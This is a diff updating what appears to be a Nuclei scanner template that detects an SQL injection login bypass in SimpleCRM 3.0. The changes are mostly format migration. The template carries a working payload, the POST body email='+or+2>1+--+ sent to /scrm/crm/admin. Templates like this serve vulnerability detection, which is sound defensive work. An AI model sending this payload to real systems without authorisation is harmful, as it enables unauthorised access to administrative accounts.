@@ -9,14 +9,17 @@ info:
     - https://packetstormsecurity.com/files/163254/simplecrm30-sql.txt
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10.0
+    cvss-score: 10
     cwe-id: CWE-89
-  tags: packetstorm,sqli,simplecrm,auth-bypass,injection
+  metadata:
+    max-request: 1
+  tags: packetstorm,sqli,simplecrm,auth-bypass,injection,vuln
 
-requests:
+http:
   - method: POST
     path:
       - "{{BaseURL}}/scrm/crm/admin"
+
     body: "email='+or+2>1+--+&password=&login="
 
     matchers-condition: and
@@ -34,5 +37,4 @@ requests:
         words:
           - "text/html"
         part: header
-
-# Enhanced by mp on 2022/03/30
+# digest: 4a0a00473045022012fa6921b49a7ef097990437bf9782dab792490aff0f3ab3d2bcf9b796e15042022100b0220de956a95fc3039b7abdd0961730aae67311836417d4f07b32ac570dccb3:922c64590222798bb761d5b6d8e72950
